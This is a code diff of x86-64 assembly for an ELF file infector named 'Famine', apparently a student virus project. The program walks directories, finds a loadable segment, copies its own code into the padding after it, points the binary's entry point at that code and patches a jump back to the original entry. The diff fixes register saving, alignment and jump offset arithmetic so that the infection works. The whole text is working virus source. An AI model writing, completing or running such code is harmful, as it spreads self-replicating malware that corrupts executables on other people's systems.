@@ -7,9 +7,23 @@ section .text
 global _start
 
 _start:
-
     ; placing famine on the stack
+	push rbp
     mov rbp, rsp
+	push rax
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push r8
+	push r9
+	push r10
+	push r11
+	push r12
+	push r13
+	push r14
+	push r15
     lea rdi, [rel dir1]                                   ; dir to open for arg readDir
     mov rsi, dir1Len
     call _readDir
@@ -25,7 +39,24 @@ _start:
     mov rsi, dir2Len
     call _readDir
 	_final_jmp:
-    jmp _exit
+	; mov rsp, rbp
+	; pop rbp
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	pop r11
+	pop r10
+	pop r9
+	pop r8
+	pop rdi
+	pop rsi
+	pop rdx
+	pop rcx
+	pop rbx
+	pop rax
+	_bf_exit:
+    jmp _Famine_exit
 
 ; take directory to open in rdi && size of pwd on rsi
 _readDir:
@@ -150,7 +181,8 @@ _check_file:
 	;*r14	-> segment header
 	; r15	== segment number
 	; rcx	-> segment index counter
-		cmp r15w, cx
+		; cmp r15w, cx
+		cmp rcx, r15
 		je	_leave_return
 		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
 		jnc _continue
@@ -197,6 +229,8 @@ _infection:
 	mov r15, rax							; r15 -> start of map
 	add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
 	add r15, [r14 + elf64_phdr.p_filesz]	; r15 -> end of the segment
+	add r15, 0x10
+	and r15, -16
 	; === stock original entrypoint === 
 	mov r12, rax
 	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
@@ -209,8 +243,6 @@ _infection:
 	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
 		mov r11, r15							; r11 -> end of curr_segment
 		sub r11, rax 							; r11 = injection offset
-		add r11, 0x10
-		and r11, -16							; align
 		mov [r12], r11							; ehdr.e_entry = injection offset
 	; === update segment hdr ===
 	_update_seg_hdr:
@@ -229,8 +261,6 @@ _infection:
 	_copy_parasite:
 	;*r15	-> segment_end
 		mov rdi, r15							; rdi -> end of curr_seg(start of injection)
-		add rdi, 0x10
-		and rdi, -16							; align
 		lea rsi, [rel _start]					; rsi -> start of our code
 		mov rcx, CODE_LEN						; counter will decrement
 		cld										; copy from _start to _end (= !std)
@@ -238,6 +268,7 @@ _infection:
 	; === update jmp end parasite ===
 	_update_parasite_jmp:
 	;*rax	-> map
+	; r10	== offset between final_jmp and original entry
 	;*r11	== injection offset
 	;*r12	-> ehdr.e_entry
 	;*r13	== original entry offset
@@ -252,15 +283,16 @@ _infection:
 		inc r15	
 		mov r10, r11
 		add r10, FINJMP_OFF
-		sub r13, r10
-		sub r13, 0x5
-		mov [r15], r13d
-
+		; sub r13, r10
+		sub r10, r13
+		add r10, 0x05
+		neg r10;
+		mov [r15], r10d
 	jmp _leave_return
 
 ; *** pas obligatoire ***
 _close_file:
-	mov	rax, qword 0x3
+	mov	rax, qword 0x03
 	mov	rdi, INF(infection.file_fd)
 	syscall
 	jmp _leave_return
@@ -277,7 +309,7 @@ _leave_return:
 	leave
 	ret
 
-_exit:
+_Famine_exit:
     mov rax, 60
     xor rdi, rdi
     syscall
